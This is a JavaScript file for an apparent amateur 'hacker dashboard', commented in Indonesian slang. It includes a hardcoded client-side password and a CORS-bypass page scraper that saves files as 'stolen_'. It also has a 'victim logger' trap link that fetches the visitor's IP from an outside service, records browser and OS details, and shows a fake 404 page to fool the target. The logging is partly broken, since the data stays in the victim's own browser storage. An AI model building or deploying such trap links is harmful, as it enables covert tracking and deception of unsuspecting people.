// --- 1. AUTH SYSTEM (Tetap Paten) ---
function terminalAuth() {
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;
    if (u === "zamxs" && p === "bokep") {
        document.getElementById('login-overlay').classList.add('hidden');
        document.getElementById('app').classList.remove('hidden');
    } else { alert("ACCESS DENIED"); }
}

// --- 2. SOURCE SNIFFER (FIXED: ANTI-CORS BYPASS) ---
async function sniffSource() {
    const target = document.getElementById('target-url').value;
    if(!target) return alert("Link mana, babi?");
    
    console.log("[OBLIVION] Launching Sniffer...");
    
    try {
        // Kita pake jembatan proxy AllOrigins dengan cache-busting biar gak diblokir
        const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(target)}&_=${new Date().getTime()}`;
        
        const response = await fetch(proxyUrl);
        if (!response.ok) throw new Error('Network response was not ok');
        
        const data = await response.json();
        
        if (data.contents) {
            const blob = new Blob([data.contents], { type: 'text/html' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `stolen_${new URL(target).hostname}.html`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            alert("SUCCESS! HTML CAPTURED & DOWNLOADED.");
        } else {
            alert("Target Empty or Protected by Cloudflare.");
        }
    } catch (e) {
        console.error(e);
        // Fallback ke Proxy kedua kalau yang pertama gagal
        alert("CORS Blocked! Trying Secondary Bypass...");
        window.open(`https://view-source:${target}`, '_blank'); 
    }
}

// --- 3. IP TRAP & VICTIM LOGGER (FIXED: REAL DATA) ---
function generateTrap() {
    // Bikin link jebakan pake URL web lu sendiri + parameter rahasia
    const trapLink = window.location.origin + window.location.pathname + "?victim=true";
    document.getElementById('trap-link').innerHTML = `
        <p style="color:yellow">Kirim Link Ini ke Target:</p>
        <input value="${trapLink}" id="copy-link" readonly style="width:80%">
        <button onclick="copyTrap()" style="width:15%">COPY</button>
    `;
}

function copyTrap() {
    const cp = document.getElementById('copy-link');
    cp.select();
    document.execCommand('copy');
    alert("Trap Link Copied!");
}

// --- AUTO-SNIFF LOGIC (Jalan pas korban klik link) ---
(async function() {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('victim')) {
        // Ambil Data Korban secara Real
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            
            const victimData = {
                ip: ipData.ip,
                os: navigator.platform,
                browser: navigator.userAgent,
                time: new Date().toLocaleString(),
                lang: navigator.language
            };

            // Simpan ke LocalStorage biar pas lu buka Dashboard lu, datanya muncul
            let logs = JSON.parse(localStorage.getItem('zamxs_logs') || "[]");
            logs.push(victimData);
            localStorage.setItem('zamxs_logs', JSON.stringify(logs));

            // Kasih efek "Error" buat nipu korban
            document.body.innerHTML = "<h1 style='color:white;font-family:sans-serif;margin:20% auto;text-align:center;'>404 Not Found<br><span style='font-size:14px'>The requested URL was not found on this server.</span></h1>";
        } catch(e) {}
    }
    
    // Tampilkan data korban di console dashboard lu
    if (document.getElementById('log-console')) {
        let logs = JSON.parse(localStorage.getItem('zamxs_logs') || "[]");
        if (logs.length > 0) {
            let html = "";
            logs.forEach((v, i) => {
                html += `[${i}] IP: ${v.ip} | OS: ${v.os} | TIME: ${v.time}<br>`;
            });
            document.getElementById('log-console').innerHTML = html;
        }
    }
})();

// --- 4. REAL QR GEN (NO BUG) ---
function makeQR() {
    const container = document.getElementById("qrcode");
    const text = document.getElementById("qr-input").value;
    container.innerHTML = ""; 
    if (!text) return alert("Isi teksnya!");

    new QRCode(container, {
        text: text,
        width: 180,
        height: 180,
        colorDark : "#000000",
        colorLight : "#ffffff",
        correctLevel : QRCode.CorrectLevel.H
    });
}
